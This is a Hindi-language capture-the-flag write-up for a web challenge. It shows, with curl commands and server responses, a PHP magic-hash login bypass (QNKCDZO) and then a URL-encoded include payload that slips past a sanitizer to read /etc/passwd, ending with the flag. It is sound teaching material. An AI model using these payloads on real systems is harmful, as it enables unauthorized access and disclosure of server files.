# Vibecode Meme Generator

> **श्रेणी:** Web · **इवेंट:** KubSTU CTF 2026 Autumn · **कठिनाई:** High

## 📌 कार्य

पेज पर एक संकेत के साथ एक Lab sign-in फ़ॉर्म है, जो Meme Studio तक ले जाता है। कमज़ोर तुलना (loose comparison) वाले PHP लॉगिन को बायपास करना है (magic hash के ज़रिए type juggling), और फिर एक लेगसी टेम्पलेट-इनक्लूड डायरेक्टिव के सैनिटाइज़र को बायपास करके सर्वर से एक फ़ाइल पढ़नी है और फ़्लैग प्राप्त करना है।

## 🏁 समाधान

### 1. Lab sign-in

पेज पर एक Lab sign-in फ़ॉर्म और एक संकेत है:

> The old login verifier compares results, not types. Inspect the request.

खिलाड़ी DevTools → Network खोलता है और देखता है:

```http
POST /login.php
Content-Type: application/x-www-form-urlencoded
```

### 2. login पर Type Juggling

सामान्य डेटा `401 Unauthorized` देता है।

types वाला संकेत PHP loose comparison और magic hash की ओर ले जाता है।

ज्ञात स्ट्रिंग:

```text
QNKCDZO
```

का MD5 है:

```text
0e830400451993494058024219903391
```

सर्वर वास्तव में एक PHP-जाँच का उपयोग करता है:

```php
md5($password) == $hash
```

इसलिए हम भेजते हैं:

```text
username=admin&password=QNKCDZO
```

curl के ज़रिए:

```bash
curl -i -c cookies.txt \
  -d 'username=admin&password=QNKCDZO' \
  http://localhost:8080/login.php
```

प्रतिक्रिया:

```http
302 Found
Location: /studio
Set-Cookie: capybara_session=admin; Path=/; HttpOnly
```

cookie को सहेजना ज़रूरी है।

### 3. Meme Studio

`/studio` पर जाने के बाद खिलाड़ी एक फ़ॉर्म देखता है:

- Caption;
- Template;
- Render meme.

संकेत:

> The renderer supports a legacy include directive. Input is cleaned before the template engine expands it. The two stages do not see exactly the same string.

फ़ॉर्म भेजता है:

```http
POST /render.php
Content-Type: application/x-www-form-urlencoded
```

### 4. फ़िल्टर की जाँच

सामान्य टेम्पलेट `classic` काम करता है।

अगर भेजा जाए:

```text
[[include:/etc/passwd]]
```

तो सर्वर `Unknown template` से उत्तर देता है, क्योंकि सैनिटाइज़ेशन इन्हें हटा देता है:

```text
..
/
\\
etc
passwd
```

### 5. सैनिटाइज़ेशन का बायपास

फ़िल्टरिंग URL-डिकोडिंग से पहले की जाती है। इसलिए हम केवल स्लैश नहीं, बल्कि उन अक्षरों को भी एन्कोड करते हैं जिन्हें फ़िल्टर अक्षरशः ढूँढता है:

```text
%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D
```

डिकोड होने के बाद यह बन जाता है:

```text
[[include:/etc/passwd]]
```

कमांड:

```bash
curl -i -b cookies.txt \
  -d 'caption=capybara&template=%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D' \
  http://localhost:8080/render.php
```

सर्वर `200 OK`, `/etc/passwd` की सामग्री और फ़्लैग लौटाता है:

```text
KubSTU{capybara_types_and_templates}
```

**फ्लैग:** `KubSTU{capybara_types_and_templates}`
